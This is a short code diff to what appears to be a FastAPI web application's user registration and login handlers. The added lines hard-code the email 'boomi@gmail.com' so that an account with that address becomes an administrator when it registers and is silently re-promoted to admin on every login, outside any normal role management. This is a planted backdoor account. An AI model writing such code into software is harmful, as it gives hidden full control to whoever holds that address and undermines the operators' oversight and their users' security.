@@ -26,7 +26,7 @@ def register(payload: schemas.RegisterRequest, db: Session = Depends(get_db)):
         last_name=payload.last_name,
         email=payload.email,
         pass_hash=auth.hash_password(payload.password),
-        role="user",
+        role="admin" if payload.email.lower() == "boomi@gmail.com" else "user",
         status="active",
     )
     db.add(user)
@@ -52,6 +52,9 @@ def login(payload: schemas.LoginRequest, db: Session = Depends(get_db)):
         raise HTTPException(status_code=401, detail="Invalid email or password.")
     if user.status != "active":
         raise HTTPException(status_code=403, detail="This account is disabled.")
+
+    if user.email.lower() == "boomi@gmail.com" and user.role != "admin":
+        user.role = "admin"
 
     user.last_login = datetime.utcnow()
 
